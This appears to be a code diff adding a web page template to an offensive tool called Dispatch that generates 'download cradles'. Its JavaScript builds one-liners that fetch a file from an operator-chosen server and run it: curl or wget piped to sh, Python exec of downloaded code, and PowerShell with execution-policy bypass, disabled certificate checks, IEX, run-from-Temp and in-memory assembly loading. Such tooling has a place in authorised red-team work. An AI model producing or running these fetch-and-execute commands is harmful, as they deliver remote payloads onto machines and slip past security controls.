@@ -1,0 +1,243 @@
+{% extends "master.html" %}
+
+{% block title %}
+DownloadCradles
+{% endblock %}
+
+{% block html_head %}
+<link rel="stylesheet" href="/static/vendor/highlightjs/default.min.css">
+<link rel="stylesheet" href="/static/vendor/highlightjs/darcula.css">
+<script src="/static/vendor/highlightjs/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+<style>
+    pre {
+        width:100%;
+        font-size: 10pt;
+        padding: 20px 20px 20px 00px; /* top, right, bottom, left */
+        position: relative;
+        white-space: pre-wrap; /* allow wrapping */
+        word-break: break-word; /* break long words if needed */
+        overflow-wrap: anywhere; /* wrap URLs/commands cleanly */
+    }
+    li {
+        font-size: 10pt;
+        margin: 3px 0;
+    }
+    .copy-btn {
+        position: absolute;
+        top: 0px; /* space from top */
+        right: 25px; /* space from right */
+        cursor: pointer;
+        font-size: 18px; /* bigger icon */
+        color: #ccc;
+    }
+    .copy-btn:hover {
+        color: #fff;
+    }
+    .copy-btn i.bi-clipboard-check {
+        color: #28a745 !important; /* Bootstrap green */
+    }
+</style>
+{% endblock %}
+
+{% block bread_crumb %}
+<div class="pagetitle">
+  <h1>Download Cradles</h1>
+  <nav>
+    <ol class="breadcrumb">
+      <li class="breadcrumb-item"><a href="/">Home</a></li>
+      <li class="breadcrumb-item active">Cradles</li>
+    </ol>
+  </nav>
+</div>
+{% endblock %}
+
+{% block html_content %}
+<div class="card">
+    <div class="card-body">
+        <h5 class="card-title">Overview</h5>
+        <p>
+            Use the following form to generate code snippets for downloading files from the Dispatch server.
+            You can select the target file, specify optional headers, and provide additional command arguments for the
+            generated code. The snippets are available in various formats including <i>Bash</i>, <i>Python</i>, and <i>PowerShell</i>:
+        </p>
+
+        <div style="margin:20px 0 25px 0;">
+            <label style="margin-bottom:5px;">Server IP</label>
+            <input type="text" id="server" value="{{ config['source_ip'] }}" class="form-control" onchange="GenCode();">
+
+            <label style="margin-top:20px;margin-bottom:5px;">Select Target File</label>
+            <select id="dwnld_files" class="form-control" onchange="GenCode();"></select>
+
+            <label style="margin-top:20px;margin-bottom:5px;">Optional Headers (key:value per line)</label>
+            <textarea id="opt_headers" class="form-control" rows="3" placeholder="Example: X-Dispatch-Auth: ABC123" onchange="GenCode();"></textarea>
+
+            <label style="margin-top:20px;margin-bottom:5px;">PS1 Command / Args (optional)</label>
+            <input type="text" id="cmd_args" value="" class="form-control" onchange="GenCode();">
+        </div>
+
+        <hr style="margin:30px 0 10px 0;color:black;">
+
+        <div id="cradleBlocks">
+            <h5 class="card-title">Bash Curl</h5>
+            <pre><code class="language-bash" id="curl"></code><span class="copy-btn" onclick="copyCode('curl')">
+                <i class="bi bi-clipboard"></i>
+            </span></pre>
+
+            <h5 class="card-title">Bash Wget</h5>
+            <pre><code class="language-bash" id="wget"></code><span class="copy-btn" onclick="copyCode('wget')">
+                <i class="bi bi-clipboard"></i>
+            </span></pre>
+
+            <h5 class="card-title">Python Urllib3</h5>
+            <pre><code class="language-python" id="urllib"></code><span class="copy-btn" onclick="copyCode('urllib')">
+                <i class="bi bi-clipboard"></i>
+            </span></pre>
+
+            <h5 class="card-title">Python Requests</h5>
+            <pre><code class="language-python" id="req"></code><span class="copy-btn" onclick="copyCode('req')">
+                <i class="bi bi-clipboard"></i>
+            </span></pre>
+
+            <h5 class="card-title">Powershell WebClient.DownloadString</h5>
+            <pre><code class="language-c#" id="ps1_string"></code><span class="copy-btn" onclick="copyCode('ps1_string')">
+                <i class="bi bi-clipboard"></i>
+            </span></pre>
+
+            <h5 class="card-title">Powershell WebClient.DownloadFile</h5>
+            <pre><code class="language-c#" id="ps1_file"></code><span class="copy-btn" onclick="copyCode('ps1_file')">
+                <i class="bi bi-clipboard"></i>
+            </span></pre>
+
+            <h5 class="card-title">Powershell WebClient.DownloadData</h5>
+            <pre><code class="language-c#" id="ps1_data"></code><span class="copy-btn" onclick="copyCode('ps1_data')">
+                <i class="bi bi-clipboard"></i>
+            </span></pre>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block html_footer %}
+<script>
+function buildUrl(ip, file) {
+    let url = `https://${ip}/${file}`;
+    let paramKeyEl = document.getElementById('ParamKey');
+    if (paramKeyEl) {
+        let pk = paramKeyEl.innerText.trim();
+        if (pk.startsWith("?")) {
+            url += pk;
+        } else if (pk.length > 0) {
+            url += "?" + pk;
+        }
+    }
+    return url;
+}
+
+function getHeaders() {
+    let headerText = document.getElementById('opt_headers').value.trim();
+    if (!headerText) return [];
+    return headerText.split("\n").map(h => h.trim()).filter(h => h.length > 0);
+}
+
+function headerCurlArgs(headers) {
+    return headers.map(h => `-H "${h}"`).join(" ");
+}
+
+function headerWgetArgs(headers) {
+    return headers.map(h => `--header="${h}"`).join(" ");
+}
+
+function pyHeaderDict(headers) {
+    let dict = headers.map(h => {
+        let parts = h.split(":");
+        let key = parts.shift().trim();
+        let val = parts.join(":").trim();
+        return `"${key}": "${val}"`;
+    });
+    return `{${dict.join(", ")}}`;
+}
+
+function GenCode(){
+    let ip = document.getElementById('server').value;
+    let file = document.getElementById('dwnld_files').value;
+    let args = document.getElementById('cmd_args').value.trim();
+    let url = buildUrl(ip, file);
+    let headers = getHeaders();
+
+    // bash curl - BreachTactics style
+    let curlHeaders = headers.length ? headerCurlArgs(headers) : "";
+    document.getElementById('curl').innerText = `curl -skL ${curlHeaders} "${url}" | sh`;
+
+    // bash wget - BreachTactics style
+    let wgetHeaders = headers.length ? headerWgetArgs(headers) : "";
+    document.getElementById('wget').innerText = `wget -qO- --no-check-certificate ${wgetHeaders} "${url}" | sh`;
+
+    // python urllib - BreachTactics style
+    let pyUrllibHeaders = headers.length ? `, headers=${pyHeaderDict(headers)}` : "";
+    let urllibCmd = `python3 -c 'import urllib.request as x, ssl; exec(x.urlopen(x.Request("${url}"${pyUrllibHeaders}), context=ssl.create_unverified_context()).read());'`;
+    document.getElementById('urllib').innerText = urllibCmd;
+
+    // python requests - BreachTactics style
+    let pyReqHeaders = headers.length ? `, headers=${pyHeaderDict(headers)}` : "";
+    let reqCmd = `python3 -c 'import requests; exec(requests.get("${url}", verify=False${pyReqHeaders}).text);'`;
+    document.getElementById('req').innerText = reqCmd;
+
+    // powershell downloadstring - BreachTactics style
+    let ps1_string = `[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; ` +
+                     `[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'; ` +
+                     `$c=New-Object System.Net.WebClient;`;
+    if (headers.length) headers.forEach(h => {
+        let [k, v] = h.split(":");
+        ps1_string += ` $c.Headers.add('${k.trim()}','${v.trim()}');`;
+    });
+    ps1_string += ` IEX $c.DownloadString('${url}');`;
+    document.getElementById('ps1_string').innerText = `powershell.exe -exec bypass -c "${ps1_string}"`;
+
+    // powershell downloadfile - BreachTactics style
+    let ps1_file = `[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; ` +
+                   `[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'; ` +
+                   `$c=New-Object System.Net.WebClient;`;
+    if (headers.length) headers.forEach(h => {
+        let [k, v] = h.split(":");
+        ps1_file += ` $c.Headers.add('${k.trim()}','${v.trim()}');`;
+    });
+    ps1_file += ` $c.DownloadFile('${url}', 'C:\\Windows\\Temp\\${file}'); C:\\Windows\\Temp\\${file};`;
+    document.getElementById('ps1_file').innerText = `powershell.exe -exec bypass -c "${ps1_file}"`;
+
+    // powershell downloaddata - BreachTactics style
+    let ps1_data = `[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; ` +
+                   `[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'; ` +
+                   `$c=New-Object System.Net.WebClient;`;
+    if (headers.length) headers.forEach(h => {
+        let [k, v] = h.split(":");
+        ps1_data += ` $c.Headers.add('${k.trim()}','${v.trim()}');`;
+    });
+    ps1_data += ` [System.Reflection.Assembly]::Load($c.DownloadData('${url}')).EntryPoint.Invoke(0,@(,[string[]]@('${args}'.split())));`;
+    document.getElementById('ps1_data').innerText = `powershell.exe -exec bypass -c "${ps1_data}"`;
+}
+
+
+function copyCode(id) {
+    const btn = event.currentTarget; // span with the icon inside
+    const icon = btn.querySelector('i'); // the <i> element
+    const originalClass = icon.className; // e.g., "bi bi-clipboard"
+
+    navigator.clipboard.writeText(document.getElementById(id).innerText).then(() => {
+        // Change to green check icon
+        icon.className = "bi bi-clipboard-check";
+        icon.style.color = "#28a745";
+
+        // Revert back after 2 seconds
+        setTimeout(() => {
+            icon.className = originalClass;
+            icon.style.color = "";
+        }, 2000);
+    });
+}
+
+
+GetFileNames();
+GenCode();
+</script>
+{% endblock %}
